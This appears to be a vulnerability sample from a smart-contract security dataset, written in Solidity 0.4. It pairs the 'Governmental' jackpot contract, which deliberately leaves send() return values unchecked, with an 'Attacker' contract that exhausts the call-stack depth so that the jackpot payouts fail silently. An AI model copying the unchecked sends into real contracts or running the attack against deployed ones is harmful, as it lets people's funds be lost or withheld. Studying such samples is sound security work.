pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE;

  function Governmental() {
    owner = getOwner();
    if (getValue() < getInitialJackpot()) throw;
    jackpot = getInitialJackpot();
    ONE_MINUTE = getOneMinute();
  }

  function invest() {
    if (msg.value < getJackpot()/2) throw;
    lastInvestor = msg.sender;
    jackpot = getJackpot() + msg.value/2;
    lastInvestmentTimestamp = getCurrentTimestamp();
  }

  function resetInvestment() {
    if (getCurrentTimestamp() < getLastInvestmentTimestamp() + getOneMinute()) throw;

    getLastInvestor().send(getJackpot());
    getOwner().send(this.balance - getInitialJackpot());

    lastInvestor = address(0);
    jackpot = getInitialJackpot();
    lastInvestmentTimestamp = 0;
  }

  function getOwner() internal view returns (address) {
    return msg.sender;
  }

  function getValue() internal view returns (uint) {
    return msg.value;
  }

  function getInitialJackpot() internal pure returns (uint) {
    return 1 ether;
  }

  function getOneMinute() internal pure returns (uint) {
    return 1 minutes;
  }

  function getJackpot() internal view returns (uint) {
    return jackpot;
  }

  function getLastInvestmentTimestamp() internal view returns (uint) {
    return lastInvestmentTimestamp;
  }

  function getCurrentTimestamp() internal view returns (uint) {
    return block.timestamp;
  }

  function getLastInvestor() internal view returns (address) {
    return lastInvestor;
  }
}

contract Attacker {
  function attack(address target, uint count) {
    if (0 <= count && count < 1023) {
      this.attack.gas(msg.gas - 2000)(target, count + 1);
    } else {
      Governmental(target).resetInvestment();
    }
  }
}